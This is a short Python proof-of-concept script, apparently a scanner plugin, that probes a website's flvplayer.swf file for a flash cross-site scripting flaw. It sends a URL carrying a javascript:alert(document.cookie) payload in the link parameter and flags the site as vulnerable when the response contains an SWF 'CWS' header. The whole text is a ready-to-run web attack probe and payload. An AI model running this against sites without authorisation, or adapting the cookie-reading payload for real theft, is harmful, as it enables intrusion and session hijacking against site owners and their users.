#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import requests

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    payload = url + "static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);"
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        r = requests.get(payload, headers=header, timeout=5)
        if r.status_code == 200 and "CWS" in r.text:
            return "[flash xss] " + payload
    except Exception:
        return False